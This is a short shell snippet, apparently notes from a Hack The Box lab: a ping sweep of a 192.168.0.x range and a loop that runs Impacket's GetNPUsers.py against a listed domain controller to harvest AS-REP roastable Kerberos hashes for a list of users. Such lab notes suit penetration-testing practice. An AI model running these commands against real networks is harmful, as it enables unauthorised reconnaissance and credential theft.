#ping all the 192.168.0.x subnet  
for i in $(seq 1 10); do (ping -c 1 192.168.0.${i} | grep "bytes from" | awk '{print $4}'&);done; 

#loops over a file "users" executes.py  
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}| grep-v Impacket;done 
